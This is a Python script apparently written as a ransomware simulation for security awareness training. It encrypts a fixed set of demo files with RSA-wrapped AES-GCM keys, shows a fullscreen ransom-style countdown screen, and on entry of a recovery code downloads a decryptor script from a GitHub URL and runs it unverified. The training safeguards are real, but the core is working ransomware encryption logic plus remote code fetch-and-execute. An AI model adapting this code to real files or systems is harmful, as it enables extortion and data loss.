from pathlib import Path
from datetime import datetime, timedelta
import os
import shutil
import subprocess
import sys
import tkinter as tk
from urllib.request import urlopen

from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Hash import SHA256
from Cryptodome.Random import get_random_bytes


# ============================================================
# SECURITY AWARENESS TRAINING DEMO
# Only these exact files inside RansomDemo/targets are touched.
# ============================================================

ROOT = Path.home() / "Desktop" / "RansomDemo"
TARGET_DIR = ROOT / "targets"
BACKUP_DIR = ROOT / ".safety_backup"
RUNTIME_DIR = ROOT / ".runtime"

PRIVATE_KEY_FILE = RUNTIME_DIR / "private.pem"
PUBLIC_KEY_FILE = RUNTIME_DIR / "public.pem"

TARGET_FILES = [
    "personal_notes.txt",
    "employees.csv",
    "config.json",
    "project_plan.md",
    "application.log",
]

DECRYPTOR_URL = (
    "https://raw.githubusercontent.com/"
    "what0302/what0302.github.io/master/_posts/demo_decrypt.py"
)

DECRYPTOR_FILE = RUNTIME_DIR / "demo_decrypt.py"

RECOVERY_CODE = "1234"
MAGIC = b"UNTDEMO1"
COUNTDOWN_MINUTES = 30


def setup_directories():
    TARGET_DIR.mkdir(parents=True, exist_ok=True)
    BACKUP_DIR.mkdir(parents=True, exist_ok=True)
    RUNTIME_DIR.mkdir(parents=True, exist_ok=True)


def generate_rsa_keys():
    if PRIVATE_KEY_FILE.exists():
        private_key = RSA.import_key(PRIVATE_KEY_FILE.read_bytes())

        if not PUBLIC_KEY_FILE.exists():
            PUBLIC_KEY_FILE.write_bytes(
                private_key.publickey().export_key()
            )

        return

    print("[+] Generating RSA-2048 training key pair...")

    key = RSA.generate(2048)

    PRIVATE_KEY_FILE.write_bytes(
        key.export_key()
    )

    PUBLIC_KEY_FILE.write_bytes(
        key.publickey().export_key()
    )

    try:
        os.chmod(PRIVATE_KEY_FILE, 0o600)
    except OSError:
        pass


def encrypt_file(filename):
    source = TARGET_DIR / filename
    backup = BACKUP_DIR / filename
    encrypted = TARGET_DIR / f"{filename}.unt"

    # Already encrypted
    if encrypted.exists():
        print(f"[SKIP] {filename}: already encrypted")
        return False

    # Only exact predefined files can reach this function.
    if not source.exists():
        print(f"[SKIP] {filename}: source file not found")
        return False

    if source.is_symlink():
        print(f"[SKIP] {filename}: symbolic links are not allowed")
        return False

    # Move original into safety backup instead of destroying it.
    if backup.exists():
        print(f"[!] Safety backup already exists for {filename}")
        return False

    shutil.move(str(source), str(backup))

    try:
        plaintext = backup.read_bytes()

        public_key = RSA.import_key(
            PUBLIC_KEY_FILE.read_bytes()
        )

        # One random AES-256 key per file.
        aes_key = get_random_bytes(32)

        aes_cipher = AES.new(
            aes_key,
            AES.MODE_GCM
        )

        ciphertext, tag = aes_cipher.encrypt_and_digest(
            plaintext
        )

        rsa_cipher = PKCS1_OAEP.new(
            public_key,
            hashAlgo=SHA256
        )

        wrapped_aes_key = rsa_cipher.encrypt(
            aes_key
        )

        temporary = encrypted.with_suffix(
            encrypted.suffix + ".tmp"
        )

        with temporary.open("wb") as f:
            f.write(MAGIC)

            f.write(
                len(wrapped_aes_key).to_bytes(2, "big")
            )
            f.write(wrapped_aes_key)

            f.write(
                len(aes_cipher.nonce).to_bytes(1, "big")
            )
            f.write(aes_cipher.nonce)

            f.write(
                len(tag).to_bytes(1, "big")
            )
            f.write(tag)

            f.write(ciphertext)

        os.replace(
            temporary,
            encrypted
        )

        print(
            f"[ENCRYPTED] {filename} -> {filename}.unt"
        )

        return True

    except Exception:
        # Something failed: restore original to targets.
        if backup.exists() and not source.exists():
            shutil.move(
                str(backup),
                str(source)
            )

        raise


def encrypt_demo_files():
    count = 0

    for filename in TARGET_FILES:
        try:
            if encrypt_file(filename):
                count += 1

        except Exception as error:
            print(
                f"[ERROR] {filename}: {error}"
            )

    return count


def download_decryptor():
    print("[+] Downloading recovery utility...")

    with urlopen(
        DECRYPTOR_URL,
        timeout=15
    ) as response:
        data = response.read()

    if len(data) < 100:
        raise RuntimeError(
            "Downloaded recovery utility is unexpectedly small."
        )

    temporary = DECRYPTOR_FILE.with_suffix(".tmp")

    temporary.write_bytes(data)

    os.replace(
        temporary,
        DECRYPTOR_FILE
    )


def show_warning_window(encrypted_count):
    root = tk.Tk()

    root.title(
        "Security Awareness Training"
    )

    root.configure(
        bg="#8b0000"
    )

    root.attributes(
        "-fullscreen",
        True
    )

    root.attributes(
        "-topmost",
        True
    )

    # Safety exit
    root.bind(
        "<Escape>",
        lambda event: root.destroy()
    )

    end_time = (
        datetime.now()
        + timedelta(minutes=COUNTDOWN_MINUTES)
    )

    header = tk.Label(
        root,
        text="SECURITY AWARENESS TRAINING",
        font=("Arial", 32, "bold"),
        fg="white",
        bg="#8b0000"
    )
    header.pack(
        pady=(50, 5)
    )

    simulation = tk.Label(
        root,
        text="CONTROLLED RANSOMWARE SIMULATION",
        font=("Arial", 18, "bold"),
        fg="yellow",
        bg="#8b0000"
    )
    simulation.pack(
        pady=5
    )

    title = tk.Label(
        root,
        text="YOUR DEMO FILES HAVE BEEN ENCRYPTED",
        font=("Arial", 40, "bold"),
        fg="white",
        bg="#8b0000"
    )
    title.pack(
        pady=(40, 20)
    )

    info = tk.Label(
        root,
        text=(
            f"{encrypted_count} TRAINING FILE(S) ENCRYPTED\n\n"
            "Files inside the controlled RansomDemo training folder "
            "are currently unavailable.\n"
            "Enter the recovery code below to launch the recovery utility."
        ),
        font=("Arial", 17),
        justify="center",
        fg="white",
        bg="#8b0000"
    )
    info.pack(
        pady=15
    )

    timer_title = tk.Label(
        root,
        text="TRAINING COUNTDOWN",
        font=("Arial", 16, "bold"),
        fg="white",
        bg="#8b0000"
    )
    timer_title.pack(
        pady=(20, 0)
    )

    timer_label = tk.Label(
        root,
        text="00:30:00",
        font=("Courier", 50, "bold"),
        fg="yellow",
        bg="#8b0000"
    )
    timer_label.pack(
        pady=5
    )

    code_label = tk.Label(
        root,
        text="RECOVERY CODE",
        font=("Arial", 16, "bold"),
        fg="white",
        bg="#8b0000"
    )
    code_label.pack(
        pady=(25, 5)
    )

    code_entry = tk.Entry(
        root,
        font=("Arial", 22),
        width=18,
        justify="center",
        show="*"
    )
    code_entry.pack(
        pady=5
    )

    code_entry.focus_set()

    status_label = tk.Label(
        root,
        text="",
        font=("Arial", 15, "bold"),
        fg="yellow",
        bg="#8b0000"
    )
    status_label.pack(
        pady=12
    )

    def update_countdown():
        remaining = (
            end_time - datetime.now()
        )

        seconds = max(
            0,
            int(remaining.total_seconds())
        )

        hours = seconds // 3600
        minutes = (
            seconds % 3600
        ) // 60
        secs = seconds % 60

        timer_label.config(
            text=(
                f"{hours:02d}:"
                f"{minutes:02d}:"
                f"{secs:02d}"
            )
        )

        if seconds > 0:
            root.after(
                1000,
                update_countdown
            )

        else:
            status_label.config(
                text=(
                    "TRAINING TIMER EXPIRED — "
                    "NO ADDITIONAL ACTION TAKEN"
                )
            )

    def recover():
        entered = (
            code_entry.get().strip()
        )

        if entered != RECOVERY_CODE:
            status_label.config(
                text="INVALID RECOVERY CODE"
            )

            code_entry.delete(
                0,
                tk.END
            )

            return

        status_label.config(
            text="RECOVERY CODE ACCEPTED"
        )

        root.update_idletasks()

        try:
            status_label.config(
                text="DOWNLOADING RECOVERY UTILITY..."
            )

            root.update_idletasks()

            download_decryptor()

            status_label.config(
                text="STARTING FILE RECOVERY..."
            )

            root.update_idletasks()

            subprocess.Popen(
                [
                    sys.executable,
                    str(DECRYPTOR_FILE)
                ]
            )

            # Recovery process now owns the next step.
            root.destroy()

        except Exception as error:
            status_label.config(
                text=(
                    "RECOVERY START FAILED: "
                    f"{error}"
                )
            )

    recover_button = tk.Button(
        root,
        text="RECOVER FILES",
        font=("Arial", 18, "bold"),
        command=recover,
        padx=25,
        pady=8
    )
    recover_button.pack(
        pady=10
    )

    code_entry.bind(
        "<Return>",
        lambda event: recover()
    )

    footer = tk.Label(
        root,
        text=(
            "SIMULATION ONLY • "
            "Only ~/Desktop/RansomDemo/targets is affected • "
            "Press ESC for safety exit"
        ),
        font=("Arial", 13),
        fg="white",
        bg="#8b0000"
    )
    footer.pack(
        side="bottom",
        pady=25
    )

    update_countdown()
    root.mainloop()


def main():
    setup_directories()
    generate_rsa_keys()

    encrypted_count = encrypt_demo_files()

    show_warning_window(
        encrypted_count
    )


if __name__ == "__main__":
    main()
